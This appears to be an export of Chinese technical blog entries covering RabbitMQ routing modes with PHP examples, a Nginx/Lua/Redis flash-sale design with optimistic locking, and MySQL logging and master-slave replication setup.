- **Topic**：通配符，把消息交给符合routing pattern（路由模式） 的队列

Exchange（交换机）只负责转发消息，不具备存储消息的能力，因此如果没有任何队列Queue与 Exchange 绑定，或者没有符合路由规则的队列，那么消息会丢失

```php
<?php
# emit_log.php 生产者
require_once __DIR__ . '/vendor/autoload.php';
use PhpAmqpLib\Connection\AMQPStreamConnection;
use PhpAmqpLib\Message\AMQPMessage;

$connection = new AMQPStreamConnection('localhost', 5672, 'guest', 'guest');
$channel = $connection->channel();

$channel->exchange_declare('logs', 'fanout', false, false, false);

$data = implode(' ', array_slice($argv, 1));
if (empty($data)) {
    $data = "info: Hello World!";
}
$msg = new AMQPMessage($data);

$channel->basic_publish($msg, 'logs');

echo ' [x] Sent ', $data, "\n";

$channel->close();
$connection->close();
```

```php
<?php
# receive_logs.php 消费者
require_once __DIR__ . '/vendor/autoload.php';
use PhpAmqpLib\Connection\AMQPStreamConnection;

$connection = new AMQPStreamConnection('localhost', 5672, 'guest', 'guest');
$channel = $connection->channel();

$channel->exchange_declare('logs', 'fanout', false, false, false);

list($queue_name, ,) = $channel->queue_declare("", false, false, true, false);

$channel->queue_bind($queue_name, 'logs');

echo " [*] Waiting for logs. To exit press CTRL+C\n";

$callback = function ($msg) {
    echo ' [x] ', $msg->body, "\n";
};

$channel->basic_consume($queue_name, '', false, true, false, false, $callback);

while ($channel->is_open()) {
    $channel->wait();
}

$channel->close();
$connection->close();
```

### Routing 路由模式

- 队列与交换机的绑定，不是任意绑定，而是要指定一个 RoutingKey（路由key）
- 消息的发送方在向 Exchange 发送消息时，也必须指定消息的 RoutingKey
- Exchange 不再把消息交给每一个绑定的队列，而是根据消息的 Routing Key 进行判断，只有队列的Routingkey 与消息的 Routing key 完全一致，才会接收到消息

![image-20220712105401217](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3753c14a07109806678a2d732c8a93c2-d776b2e.png)

```
P：生产者，向 Exchange 发送消息，发送消息时，会指定一个routing key
X：Exchange（交换机），接收生产者的消息，然后把消息递交给与 routing key 完全匹配的队列
C1：消费者，其所在队列指定了需要 routing key 为 error 的消息
C2：消费者，其所在队列指定了需要 routing key 为 info、error、warning 的消息
```

```php
<?php
# emit_log_direct.php 生产者
require_once __DIR__ . '/vendor/autoload.php';
use PhpAmqpLib\Connection\AMQPStreamConnection;
use PhpAmqpLib\Message\AMQPMessage;

$connection = new AMQPStreamConnection('localhost', 5672, 'guest', 'guest');
$channel = $connection->channel();

$channel->exchange_declare('direct_logs', 'direct', false, false, false);

$severity = isset($argv[1]) && !empty($argv[1]) ? $argv[1] : 'info';

$data = implode(' ', array_slice($argv, 2));
if (empty($data)) {
    $data = "Hello World!";
}

$msg = new AMQPMessage($data);

$channel->basic_publish($msg, 'direct_logs', $severity);

echo ' [x] Sent ', $severity, ':', $data, "\n";

$channel->close();
$connection->close();
```

```php
<?php
# receive_logs_direct.php 消费者
require_once __DIR__ . '/vendor/autoload.php';
use PhpAmqpLib\Connection\AMQPStreamConnection;

$connection = new AMQPStreamConnection('localhost', 5672, 'guest', 'guest');
$channel = $connection->channel();

$channel->exchange_declare('direct_logs', 'direct', false, false, false);

list($queue_name, ,) = $channel->queue_declare("", false, false, true, false);

$severities = array_slice($argv, 1);
if (empty($severities)) {
    file_put_contents('php://stderr', "Usage: $argv[0] [info] [warning] [error]\n");
    exit(1);
}

foreach ($severities as $severity) {
    $channel->queue_bind($queue_name, 'direct_logs', $severity);
}

echo " [*] Waiting for logs. To exit press CTRL+C\n";

$callback = function ($msg) {
    echo ' [x] ', $msg->delivery_info['routing_key'], ':', $msg->body, "\n";
};

$channel->basic_consume($queue_name, '', false, true, false, false, $callback);

while ($channel->is_open()) {
    $channel->wait();
}

$channel->close();
$connection->close();
```

### Topics 通配符模式

- Topic 类型与 Direct 相比，都是可以根据 RoutingKey 把消息路由到不同的队列。只不过 Topic 类型Exchange 可以让队列在绑定 Routing key 的时候使用通配符

- Routingkey 一般都是有一个或多个单词组成，多个单词之间以”.”分割，例如： item.insert

- 通配符规则：`#` 匹配0个或多个单词，`*` 匹配1个单词，

  例如：`item.#` 能够匹配 `item.insert.abc,` 或者 `item.insert`. 

  `item.*` 只能匹配 `item.insert`

![image-20220712110100820](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/48e93035a0b9b56a10c3a322efa5527a-565deff.png)

```
红色 Queue：绑定的是 usa.# ，因此凡是以 usa. 开头的 routing key 都会被匹配到
黄色 Queue：绑定的是 #.news ，因此凡是以 .news 结尾的 routing key 都会被匹配
```

```php
<?php
# emit_log_topic.php 生产者
require_once __DIR__ . '/vendor/autoload.php';
use PhpAmqpLib\Connection\AMQPStreamConnection;
use PhpAmqpLib\Message\AMQPMessage;

$connection = new AMQPStreamConnection('localhost', 5672, 'guest', 'guest');
$channel = $connection->channel();

$channel->exchange_declare('topic_logs', 'topic', false, false, false);

$routing_key = isset($argv[1]) && !empty($argv[1]) ? $argv[1] : 'anonymous.info';
$data = implode(' ', array_slice($argv, 2));
if (empty($data)) {
    $data = "Hello World!";
}

$msg = new AMQPMessage($data);

$channel->basic_publish($msg, 'topic_logs', $routing_key);

echo ' [x] Sent ', $routing_key, ':', $data, "\n";

$channel->close();
$connection->close();
```

```php
<?php
# receive_logs_topic.php 消费者
require_once __DIR__ . '/vendor/autoload.php';
use PhpAmqpLib\Connection\AMQPStreamConnection;

$connection = new AMQPStreamConnection('localhost', 5672, 'guest', 'guest');
$channel = $connection->channel();

$channel->exchange_declare('topic_logs', 'topic', false, false, false);

list($queue_name, ,) = $channel->queue_declare("", false, false, true, false);

$binding_keys = array_slice($argv, 1);
if (empty($binding_keys)) {
    file_put_contents('php://stderr', "Usage: $argv[0] [binding_key]\n");
    exit(1);
}

foreach ($binding_keys as $binding_key) {
    $channel->queue_bind($queue_name, 'topic_logs', $binding_key);
}

echo " [*] Waiting for logs. To exit press CTRL+C\n";

$callback = function ($msg) {
    echo ' [x] ', $msg->delivery_info['routing_key'], ':', $msg->body, "\n";
};

$channel->basic_consume($queue_name, '', false, true, false, false, $callback);

while ($channel->is_open()) {
    $channel->wait();
}

$channel->close();
$connection->close();
```

### 工作模式总结

- **简单模式** HelloWorld

  一个生产者、一个消费者，不需要设置交换机（使用默认的交换机）。

- **工作队列模式** Work Queue

  一个生产者、多个消费者（竞争关系），不需要设置交换机（使用默认的交换机）。

- **发布订阅模式** Publish/subscribe

  需要设置类型为 fanout 的交换机，并且交换机和队列进行绑定，当发送消息到交换机后，交换机会将消息发送到绑定的队列。

- **路由模式** Routing

  需要设置类型为 direct 的交换机，交换机和队列进行绑定，并且指定 routing key，当发送消息到交换机后，交换机会根据 routing key 将消息发送到对应的队列。

- **通配符模式** Topic

  需要设置类型为 topic 的交换机，交换机和队列进行绑定，并且指定通配符方式的routing key，当发送消息到交换机后，交换机会根据 routing key 将消息发送到对应的队列。

## 高级特性

### 消息可靠性投递

在使用 RabbitMQ 的时候，作为**消息发送方**希望杜绝任何**消息丢失**或者**投递失败**场景。RabbitMQ 提供两种方式用来控制消息的投递可靠性模式。

- **confirm 确认模式**

  此模式是作用在**生产者**的，开启了这个模式就可以知道消息有没有发送到 **Exchange**上。不管有没有发送到都会触发回调方法。

  - 消息成功投递到Exchange, 返回ack
  - 消息未投递到Exchange, 返回nack

- **return 退回模式**

  此模式同样是作用在**生产者**端的，这个模式就是为了知道消息有没有发送到对应的 **Queue**上。如果发送到了对应的队列不会触发回调方法，如果没有发送到对应的队列才会触发回调方法。

  即消息投递到交换机了，但是没有路由到队列，返回ACK，及路由失败原因。

```
rabbitmq 整个消息投递的路径为：
           producer--->rabbitmq broker--->exchange--->queue--->consumer
 - 消息从 producer 到 exchange 则会返回一个 confirmCallback 。
 - 消息从 exchange-->queue 投递失败则会返回一个 returnCallback 。
我们将利用这两个 callback 控制消息的可靠性投递
```

### Consumer ACK

**Ack** 指 **Acknowledge**确认。 表示消费端收到消息后的确认方式。有三种确认方式：

- 自动确认：`acknowledge="none"`
- 手动确认：`acknowledge="manual"`
- 根据异常情况确认：`acknowledge="auto"`

其中自动确认是指，当消息一旦被**Consumer**接收到，则自动确认收到 (`AMQP_AUTOACK`)，并将相应 `message` 从 RabbitMQ 的消息缓存中移除。

但是在实际业务处理中，很可能消息接收到，业务处理出现异常，那么该消息就会丢失。如果设置了**手动确认**方式，则需要在业务处理成功后，调用`ack()`，手动签收。

如果出现异常，则调用`nack()`方法，让其自动**重新发送**消息。

```
即要达到消息的可靠性, 需要以下方面配合:
 - 持久化
    • Exchange要持久化
    • Queue要持久化
    • message要持久化
 - 生产方确认Confirm
 - 消费方确认Ack
 - Broker高可用
```

### 消费端限流

消息队列中囤积了大量的消息, 或者某些时刻生产的消息远远大于消费者处理能力的时候, 这个时候如果消费者一次取出大量的消息, 但是客户端又无法处理, 就会出现问题, 甚至可能导致服务崩溃, 所以需要对消费端进行限流

RabbitMQ提供了一种**qos(服务质量保证)**功能, 即在非自动确认消息的前提下, 如果一定数目的消息(通过consumer或者channel设置qos的值)未被确认前, 不进行消费新的消息

```
消费端的确认模式一定为手动确认。acknowledge="manual"
channel.setPrefetchSize : 消息大小限制, 一般设置为0, 消费端不做限制
channel.setPrefetchCount : 会告诉RabbitMQ不要同时给一个消费者推送多于N个消息, 即一旦有N个消息还没有ack, 则该consumer将block(阻塞), 直到有消息ack
```

### TTL

**TTL** 全称 **Time To Live**（**存活时间/过期时间**）。当消息到达存活时间后，还没有被消费，会被自动清除。
RabbitMQ 可以对**消息**设置过期时间，也可以对整个**队列**（Queue）设置过期时间。

```
设置队列过期时间使用参数：x-message-ttl，单位：ms(毫秒)，会对整个队列消息统一过期。

设置消息过期时间使用参数：expiration。单位：ms(毫秒)，当该消息在队列头部时（消费时），会单独判断这一消息是否过期。

如果两者都进行了设置，以时间短的为准。
```

### 死信队列

死信队列，英文缩写：**DLX** 。**Dead Letter Exchange**（**死信交换机**），当消息成为Dead message后，可以被重新发送到另一个交换机，这个交换机就是DLX。

如果这个包含死信的队列配置了`dead-letter-exchange`属性，指定了一个交换机，那么队列中的死信就会投递到这个交换机中，而这个交换机称为**死信交换机**（Dead Letter Exchange，检查DLX）

![image-20220712135131320](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8400f6d6dca3bfa82e81db7608ab2441-385bb10.png)

消息成为死信的三种情况：
1. 队列消息长度到达限制；
2. 消费者拒接消费消息，Nack/Reject,并且不把消息重新放入原目标队列,requeue=false；
3. 原队列存在消息过期设置，消息到达超时时间未被消费

### 延迟队列

延迟队列，即消息进入队列后不会立即被消费，只有到达指定时间后，才会被消费。

```
如需求：
 - 下单后，30分钟未支付，取消订单，回滚库存。
 - 新用户注册成功7天后，发送短信问候。
```

可以使用 **TTL+死信队列** 组合**实现延迟队列**的效果。

![image-20220712135435128](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a28075f703394aab53246a0bc4d51633-d0d7ea0.png)

也可以通过使用**DelayExchange**插件实现

```shell
rabbitmq-plugins enable rabbitmq_delayed_message_exchange
# 文档: https://github.com/rabbitmq/rabbitmq-delayed-message-exchange
```

DelayExchange插件对官方原生的Exchange做了功能升级:

- 将DelayExchange中接收到的消息暂存在内存中
- 在DelayExchange中计时, 超时后才投递消息到队列

管理平台声明一个DelayExchange: 

![image-20220712185348243](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/abf47e01b132a72b26cf044923bd478e-95f15e9.png)

### 日志与监控

RabbitMQ默认日志存放路径： `/var/log/rabbitmq/rabbit@xxx.log`

日志包含了RabbitMQ的版本号、Erlang的版本号、RabbitMQ服务节点名称、cookie的hash值、RabbitMQ配置文件地址、内存限制、磁盘限制、默认账户guest的创建以及权限配置等等。

也可以通过web控制台/命令行监控

```
# 查看队列
rabbitmqctl list_queues

# 查看exchanges
rabbitmqctl list_exchanges

# 查看用户
rabbitmqctl list_users

# 查看连接
rabbitmqctl list_connections

# 查看消费者信息
rabbitmqctl list_consumers

# 查看环境变量
rabbitmqctl environment

# 查看未被确认的队列
rabbitmqctl list_queues name messages_unacknowledged

# 查看单个队列的内存使用
rabbitmqctl list_queues name memory

# 查看准备就绪的队列
rabbitmqctl list_queues name messages_ready
```

### 消息追踪

在使用任何消息中间件的过程中，难免会出现某条**消息异常丢失**的情况。

对于RabbitMQ而言，可能是因为生产者或消费者与RabbitMQ断开了连接，而它们与RabbitMQ又采用了不同的确认机制；也有可能是因为交换器与队列之间不同的转发策略；甚至是交换器并没有与任何队列进行绑定，生产者又不感知或者没有采取相应的措施；另外RabbitMQ本身的集群策略也可能导致消息的丢失。这个时候就需要有一个较好的机制**跟踪记录消息的投递过程**，以此协助开发和运维人员进行问题的定位。

在RabbitMQ中可以使用 **Firehose** 和 **rabbitmq_tracing插件** 功能来实现消息追踪。

- **Firehose**

  firehose的机制是将生产者投递给rabbitmq的消息，rabbitmq投递给消费者的消息 按照指定的格式发送到**默认的exchange**上。

  这个默认的exchange的名称为`amq.rabbitmq.trace`，它是一个**topic类型**的exchange。

  发送到这个exchange上的消息的`routing key`为 `publish.exchangename` 和`deliver.queuename`。其中`exchangename`和`queuename`为实际exchange和queue的名称，分别对应**生产者投递到exchange的消息**，和**消费者从queue上获取的消息** 

  ![image-20220712140547006](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/aee3f04b21ad52736bc5a03b3e6129ed-dbd411f.png)

  ```
  rabbitmqctl trace_on：开启Firehose命令
  rabbitmqctl trace_off：关闭Firehose命令
  注意：打开 trace 会影响消息写入功能，适当打开后请关闭。
  ```

- **rabbitmq_tracing**

  rabbitmq_tracing和Firehose在实现上如出一辙，只不过rabbitmq_tracing的方式比Firehose多了一
  层GUI的包装，更容易使用和管理。

  ```
  启用插件：rabbitmq-plugins enable rabbitmq_tracing
  ```

  ![image-20220712141212675](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1033b16f0ebc170558225fb6407130c7-9444cf8.png)

]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>RabbitMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx+lua+redis秒杀实现</title>
    <url>/2021/10/21/Nginx/Nginx+lua+redis%E7%A7%92%E6%9D%80%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[
## 秒杀设计

### 秒杀特点

时间短, 并发访问量大

> 秒杀系统独立部署, 独立域名, 不影响现有系统业务

#### 前端优化问题

```
秒杀页面有大量访问, 需要做限制
- 按钮置灰, 时间不到不发送请求(后端需要双重验证)
- 用户点击请求后, 按钮置灰, 防止重复提交
- 限制用户在n秒内只能提交一次
- 前端缓存前端资源, 刷新时从缓存中获取数据
```

#### 带宽问题

提前购买或租借新增网络带宽 ,减轻服务器带宽压力, 并推荐租用CDN服务

#### 超卖问题

下单数大于库存数, 导致超卖

### 主流解决方案

#### 1.mysql悲观锁

即使用MySQL悲观锁实现数据的一致性和排它性

```
mysql> select * from t_goods where id = 1 for update;
```

> 但会导致MySQL性能问题, 存在大量锁等待

#### 2.mysql乐观锁

引入MySQL版本号的概念, 实现代码层的数据一致

```
mysql> update goods set quantity = quantity - 1,version = version - 1 where id = 1 and version = {$version};
```

执行成功的, 代表秒杀成功, 继续执行订单操作,

SQL执行失败, 则代表秒杀失败

> 但由于需要在数据库中操作, 大量连接会给MySQL造成压力

#### 3.PHP队列

引入队列, 将所有请求序列化放入队列, 依次执行

> 但会导致执行时间过长

#### 4.PHP+Redis分布式锁

引入Redis分布式锁, 锁定PHP线程, 只有抢到锁的线程会执行, 其余线程空转等待

Redis特性如下:

![image-20211114002141949](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211114002141949.png)

> 即setnx只会给第一个用户赋予, 返回1成功, 后续用户无法设置成功, 返回0失败

```php
<?php

$redis = new Redis();
$redis->connect('127.0.0.1','6379');

$expire = 10;
$key = 'lock_key';
$value = time()+$expire;
$status = true;

while($status){
    $lock = $redis->setnx($key, $value);
    if (empty($lock)){
        usleep(20);
        $value = $redis->get($key);
        if ($value < time()){
            $redis->del($key);
        }
    }else{
        $status = false;
        secKillSuccess($redis, $key);
    }
}

function secKillSuccess(Redis $redis, $key){
    $redis->del($key);
    echo 'kill success in ' . date(time());
}
```

> 该方案弊端在于PHP线程空转导致PHP进程激增, 直到上限

#### 5.PHP+Redis乐观锁

打断机制

```php

$redis = new Redis();
$redis->connect('127.0.0.1','6379');

$key = 'lock_optimistic';
$number = 10;

$redis->watch($key);	// 乐观锁, 监视key变化时,回滚当前事务 
$sales = $redis->get($key);

if ($sales >= $number){
    exit('结束秒杀');
}

// 开启redis事务
$redis->multi();
$redis->incr($key);
$result = $redis->exec();

if ($result){
    secKillSuccess();
}else{
    exit('抢购失败');
}

function secKillSuccess(){
    echo 'kill success in ' . date(time());
}
```

压测结果如下

![image-20211114023236143](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211114023236143.png)

> 存在序列优先但被打断的案例, 非真实的优先排列

### 使用方案

nginx+lua+redis

1.前端资源静态化, 使用cdn

2.后端提交请求处理

​	接入层使用nginx漏桶限流, nginx+lua+redis实现乐观锁, 解决超卖问题

​	应用层只需处理设定秒杀量的请求, 利用缓存+队列+分布式+分库分表处理订单

安装nginx_lua扩展

#### 具体实现

**nginx.conf**

```nginx
http {
    lua_shared_dict my_limit_req_store 100m;    # 设置lua共享内存
    server {
            location /sec_kill{
            default_type 'text/html';
            content_by_lua_file /usr/local/openresty/nginx/lua_script/lua_sec_kill.lua;
        	}
    }
}
```

**lua_sec_kill.lua**

```lua
local request_method = ngx.var.request_method
local args = nil
local param = nil

-- 处理请求参数
if request_method == 'GET' then
	args = ngx.req.get_uri_args()
elseif request_method == 'POST' then
	ngx.req.read_body()
	args = ngx.req.get_post_args()
end

local user_id = args["user_id"]

-- 关闭Redis本地函数
local function close_redis(redis_instance)
	if not redis_instance then
		return
	end
	local ok,err = redis_instance:close()
	if not ok then
		ngx.say('Redis server close failed: ', err)
	end
end

-- 限流
local limit_req = require "resty.limit.req"
-- 设置速率为50个请求/每秒, 漏桶容量为1000个请求
local lim,err = limit_req.new("my_limit_req_store", 50, 1000)
if not lim then
	ngx.say('Failed to instantiate a resty.limit.req object:',err)
	return
end

local key = ngx.var.remote_addr
ngx.say('key is: ',key,'<br/>')
local delay,err = lim:incoming(key, true)
ngx.say('delay is: ', delay,'<br/>')

-- 1000以外的请求全部溢出拒绝掉
if not delay then
	if err == 'rejected' then
		return ngx.say('1000 over, spill them all!')
	end
		ngx.log(ngx.ERR, 'failed to limit req: ',err)
		ngx.say(ngx.ERR, 'failed to limit req: ',err,'<br/>')
	return ngx.exit(502)
end

if delay>10 then
	ngx.say('delay time over time!','<br/>')
	return
end


-- Redis中添加sku_num键(商品数量), 并添加watch_key(乐观锁用)
-- 连接Redis服务
local redis = require 'resty.redis'
local redis_instance = redis:new()

redis_instance:set_timeout(1000)
local ok,err = redis_instance:connect("192.168.253.135",6379)
if not ok then
    ngx.say('failed to connection with redis',err,'<br/>')
    return
end 

-- 秒杀逻辑
local resp, err = redis_instance:get('sku_num')
resp = tonumber(resp)
ngx.say('goods number sku_number is : ', resp, '<br/>')
if resp>0 then
	ngx.say('sec_kill success','<br/>')
	redis_instance:watch('watch_key')
	ngx.sleep(1)
	local ok,err = redis_instance:multi();
	local sku_num = resp - 1
	ngx.say('goods number sku_number now is : ', sku_num, '<br/>')
	redis_instance:set('sku_num', sku_num)
	redis_instance:set('watch_key', 1)
	ans,err = redis_instance:exec()
	ngx.say('Redis response is : ', tostring(ans), '--', '<br/>')
	if tostring(ans) == 'userdata: NULL' then
		ngx.say('purchase failed, please earlier next', '<br/>')
		return
	else
		ngx.say('purchase success!', '<br/>')
		return
	end
else
	ngx.say('sec_kill failed!', '<br/>')
end

-- 执行下单
-- ngx.exec('/create_order')
```

#### 查看结果

![image-20220614124541176](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/851d55833ca1f2a006d32a83c36a45f8-af497f4.png)

![image-20220614124518241](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/069276e410c012eabf5d4318e3085915-cbff945.png)]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>Redis</tag>
        <tag>后端</tag>
        <tag>Lua</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL高可用</title>
    <url>/2022/07/12/MySql/MySQL%E8%BF%90%E7%BB%B4/</url>
    <content><![CDATA[
## 日志

### 错误日志

错误日志记录了当 mysqld 启动和停止时，以及服务器在运行过程中发生任何严重错误时的相关信息。当数据库出现任何故障导致无法正常使用时，建议首先查看此日志。

该日志是默认开启的，默认存放目录 `/var/log/`

```mysql
show variables like '%log_error%';
```

![image-20220726121449746](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5939161a61c708ad819f9ee6427dd637-e7b480c.png)

### 二进制日志

#### 介绍

二进制日志（**binlog**）记录了所有的 DDL（数据定义语言）语句和 DML（数据操作语言）语句，但不包括数据查询（SELECT、SHOW）语句。

作用：①. 灾难时的数据恢复；②. MySQL的主从复制。

```mysql
show variables like '%log_bin%';
```

![image-20220726121634318](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d17b108b420f774120654be6a4ebf94e-5f5b0e1.png)

```
参数说明：
	log_bin_basename：当前数据库服务器的binlog日志的基础名称(前缀)，具体的binlog文件名需要在该basename的基础上加上编号(编号从000001开始)。
	log_bin_index：binlog的索引文件，里面记录了当前服务器关联的binlog文件有哪些。
```

#### 格式

MySQL服务器中提供了多种格式来记录二进制日志，具体格式及特点如下：

| 日志格式 | 含义 |
| -------- | ---- |
|STATEMENT|基于SQL语句的日志记录，记录的是SQL语句，对数据进行修改的SQL都会记录在日志文件中。|
|ROW |基于行的日志记录，记录的是每一行的数据变更。（默认）|
|MIXED|混合了STATEMENT和ROW两种格式，默认采用STATEMENT，在某些特殊情况下会自动切换为ROW进行记录。|

```mysql
show variables like '%binlog_format%';
```

![image-20220726121932942](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/166f4c7675401ddea5e0d8f3f40a6ca1-257b7cf.png)

#### 查看

由于日志是以二进制方式存储的，不能直接读取，需要通过二进制日志查询工具 mysqlbinlog 来查看.

```
语法：
	mysqlbinlog [ 参数选项 ] logfilename
参数选项：
 -d 指定数据库名称，只列出指定的数据库相关操作。
 -o 忽略掉日志中的前n行命令。
 -v 将行事件(数据变更)重构为SQL语句
 -vv 将行事件(数据变更)重构为SQL语句，并输出注释信息
```

#### 删除

对于比较繁忙的业务系统，每天生成的binlog数据巨大，如果长时间不清除，将会占用大量磁盘空间。可以通过以下几种方式清理日志：

- 手动清理

    ```mysql
    -- 删除全部 binlog 日志，删除之后，日志编号，将从 binlog.000001重新开始
    reset master;

    -- 删除 * 编号之前的所有日志
    purge master logs to 'binlog.*';

    -- 删除日志为 "yyyy-mm-dd hh24:mi:ss" 之前产生的所有日志
    purge master logs before 'yyyy-mm-dd hh24:mi:ss';
    ```

- 自动清理

  也可以在mysql的配置文件中配置二进制日志的过期时间，设置了之后，二进制日志过期会自动删除。

    ```mysql
  show variables like '%binlog_expire%';
    ```

  ![image-20220726122244549](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b67cce64faed825f2989c1f4b34c3078-18a1b02.png)

### 查询日志

查询日志中记录了客户端的所有操作语句。默认情况下，查询日志是关闭的。

```mysql
show variables like '%general%';
```

![image-20220726122453590](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3d5af4d55f81ff3674f178c530c6d00d-c6698bb.png)

开启了查询日志之后，在MySQL的数据存放目录 `/var/lib/mysql/` 下就会出现QUERY_LOG文件。之后所有的客户端的增删改查操作都会记录在该日志文件之中，长时间运行后，该日志文件将会非常大。

### 慢查询日志

慢查询日志记录了所有执行时间超过参数 `long_query_time` 设置值并且扫描记录数不小于`min_examined_row_limit` 的所有的SQL语句的日志，默认关闭的。long_query_time 默认为10 秒，最小为 0， 精度可以到微秒。

```mysql
show variables like '%slow_query%';
show variables like '%long_query%';
show variables like '%min_examined%';
```

![image-20220726122845752](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/36d1221132a385354e3aa4270c294e14-ee376c0.png)

![image-20220726122858753](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/302dc0be08a63e0b49e0f643951a9f1d-7cfe564.png)

![image-20220726123029616](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/17c5a52aedf3c3f28793f50a0b494bc7-bc76aca.png)



默认情况下，不会记录管理语句，也不会记录不使用索引进行查找的查询。

```mysql
-- 是否记录执行较慢的管理语句
show variables like '%log_slow_admin%';

-- 是否记录执行较慢的未使用索引的语句
show variables like '%log_queries%';
```

![image-20220726123224650](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/96aff562f836bac3d6a526a654e8652d-7aff177.png)

![image-20220726123143437](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8422dc20d38bed30242cf9954d1ebdd8-abe53a2.png)



## 主从复制

**主从复制**是指将**主数据库**的 DDL 和 DML 操作通过二进制日志传到**从库服务器**中，然后在**从库**上对这些日志**重新执行**（也叫**重做**），从而使得从库和主库的**数据保持同步**。

MySQL支持一台主库同时向多台从库进行复制， 从库同时也可以作为其他从服务器的主库，实现链状复制。

MySQL 复制的优点主要包含以下三个方面：

- 主库出现问题，可以快速切换到从库提供服务。
- 实现读写分离，降低主库的访问压力。
- 可以在从库中执行备份，以避免备份期间影响主库服务。

### 原理

MySQL主从复制的核心就是 **二进制日志(binlog)**，具体的过程如下：

![image-20220726153302978](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/15d2d051abdc7d99c05e705d14b96abe-aa6eb8c.png)

主从复制分成三步：
1. Master 主库在事务提交时，会把数据变更记录在二进制日志文件 **Binlog** 中。
2. 从库读取主库的二进制日志文件 **Binlog** ，写入到从库的中继日志 **Relay Log** 。
3. slave**重做**中继日志中的事件，将改变反映它自己的数据。

### 搭建

#### 准备服务器

1. 准备主从服务器

   在两台服务器中分别安装好MySQL，并完成基础的初始化准备(安装、密码配置等操作)工作。 其中：

   - 192.168.253.134 作为主服务器master
   - 192.168.253.135 作为从服务器slave

2. 开启防火墙端口

   ```shell
   sudo ufw allow 3306
   或关闭
   sudo ufw disable
   ```

   ![image-20220726153946997](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9edc3b5b82bcd7d14ef1ba0dfe0973dd-602b76a.png)

3. 检测mysql安装状态

   ![image-20220726154224171](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c2f9a7477d1304b47ca633562f5fce48-f7e5965.png)

#### 主库配置

1. 修改配置文件 `/etc/mysql/mysql.conf.d/mysqld.cnf` 

    ```properties
    # mysql 服务ID，保证整个集群环境中唯一，取值范围：1 – 2^32-1，默认为1
    server-id               = 1000
    # 开启binlog,指定日志文件目录及名称
    log_bin                 = /var/log/mysql/mysql-bin.log
    max_binlog_size   		= 100M
    #是否只读,1 代表只读, 0 代表读写
    read-only				= 0
    # 指定同步的数据库
    binlog_do_db           = ni9nes_DB
    # 忽略的数据库, 指不需要同步的数据库
    #binlog_ignore_db       = include_database_name
    ```
    
2. 登录mysql，创建远程连接的账号，并授予主从复制权限

    ```mysql
    -- 创建用户，并设置密码，该用户可在任意主机连接该MySQL服务
    CREATE USER 'replica'@'%' IDENTIFIED WITH mysql_native_password BY 'Root@123456';
    -- 为 'replica'@'%' 用户分配主从复制权限
    GRANT REPLICATION SLAVE ON *.* TO 'replica'@'%';
    FLUSH PRIVILEGES;
    ```

3. 重启MySQL服务器

    ```shell
    $ sudo service mysql restart
    ```

4. 通过指令，查看二进制日志坐标

    ```mysql
    show master status; 
    ```

    ![image-20220726163143220](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c96da3c23d9889af986289fc60678f1b-eb68f33.png)

    ```
    字段含义说明：
      file : 从哪个日志文件开始推送日志文件
      position ： 从哪个位置开始推送日志
      binlog_do_db : 指定需要同步的数据库
      binlog_ignore_db : 指定不需要同步的数据库
    ```

#### 从库配置

1. 修改配置文件 `/etc/mysql/mysql.conf.d/mysqld.cnf` 

   ```properties
   # mysql 服务ID，保证整个集群环境中唯一，取值范围：1 – 2^32-1，和主库不一样即可
   server-id			= 1001
   # 是否只读,1 代表只读, 0 代表读写
   read-only			= 1
   ```

2. 重新启动MySQL服务

   ```shell
   $ sudo service mysql restart
   ```

3. 登录从库mysql，设置主从配置

   ```mysql
   CHANGE MASTER TO MASTER_HOST='192.168.253.134', MASTER_USER='replica',MASTER_PASSWORD='Root@123456', MASTER_LOG_FILE='mysql-bin.000030',MASTER_LOG_POS=154;
   ```

   | 参数名 | 含义 |
   | ------ | ---- |
   |MASTER_HOST |主库IP地址 |
   |MASTER_USER |连接主库的用户名 |
   |MASTER_PASSWORD |连接主库的密码 |
   |MASTER_LOG_FILE |binlog日志文件名 |
   |MASTER_LOG_POS |binlog日志文件位置 |
   
4. 开启同步操作

   ```mysql
   start slave;
   ```

5. 查看主从同步状态

   ```mysql
   show slave status;
   ```

   ![image-20220726170420647](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/35cd7c142633767ff218600b4bf8656c-6ed84e1.png)

> 注意: 若虚拟机为复制的多个实例, 需要修改server_uuid, 避免报错
>
> `sudo vi /var/lib/mysql/auto.cnf`

## 分库分表

### 介绍

随着互联网及移动互联网的发展，应用系统的数据量也是成指数式增长，若采用单数据库进行数据存储，存在以下性能瓶颈：

- **IO瓶颈**：热点数据太多，数据库缓存不足，产生大量磁盘IO，效率较低。 请求数据太多，带宽不够，网络IO瓶颈。

